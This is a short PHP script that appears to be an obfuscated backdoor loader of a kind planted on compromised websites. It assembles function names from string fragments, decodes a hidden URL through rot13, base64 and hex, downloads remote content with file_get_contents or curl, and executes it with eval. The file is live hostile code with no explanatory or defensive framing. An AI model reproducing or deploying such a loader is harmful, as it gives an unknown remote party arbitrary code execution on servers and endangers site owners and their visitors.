<?php
$fgc = 'f'.'i'.'le'.'_ge'.'t_'.'co'.'n'.'te'.'nt'.'s';
function bunvis($url)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $response = curl_exec($ch);
  curl_close($ch);
  return $response;
}
function bunvisGanteng($ipt)
{
  $dx = 'd'.'e'.'c'.'h'.'e'.'x';
  $bec = 'ba'.'s'.'e6'.'4_'.'en'.'co'.'de';
  $odr = 'or'.'d';
  $sln = 'st'.'rl'.'en';
  $strt = 's'.'tr_'.'rot'.'13';
  $hex = '';
  for ($i = 0; $i < $sln($ipt); $i++) {
    $hex .= $dx($odr($ipt[$i]));
  }
  $base64 = $bec($hex);
  return $strt($base64);
}
function bunny($my_self)
{
  $sln = 'st'.'rl'.'en';
  $strt = 'st'.'r_'.'r'.'ot13';
  $bdec = 'b'.'as'.'e'.'64_de'.'co'.'de';
  $hrc = 'ch'.'r';
  $hxc = 'h'.'ex'.'de'.'c';
  $subr = 's'.'ub'.'st'.'r';
  $rEq = $strt($my_self);
  $bsfD = $bdec($rEq);
  $record = '';
  for ($i = 0; $i < $sln($bsfD); $i += 2) {
    $record .= $hrc($hxc($subr($bsfD, $i, 2)));
  }
  return $record;
}
$my_self = 'Awt3AQp0AmN3ZmAuZzLlMwplAwR3AmWyAwp2BGp0Awt3AGLlAmH3ZmL1AmV2ZmMzAzH3AQL1AzH3AQWyAwZ2MwMxZzL0BGMyAmL2BGpmAwx2ZwMwAwH0Zwp1AzH2MGp5ZzL1ZwL1AwZ2MwplAwD3ZmWzAzD2ZGL5AzHlMwDlAmH2MGMyAmxlMQExAwx2MGL5ZzL2ZGMwAwL2ZGWzAwR2LmL2AwRlMGpjAwt3ZN==';
$record = bunny($my_self);
$response = @$fgc($record);
if (empty($response)) {
  $response = bunvis($record);
}
if (is_string($response)) {
  eval('?>' . $response);
} else {
  echo "Error: Unable to retrieve content.";
}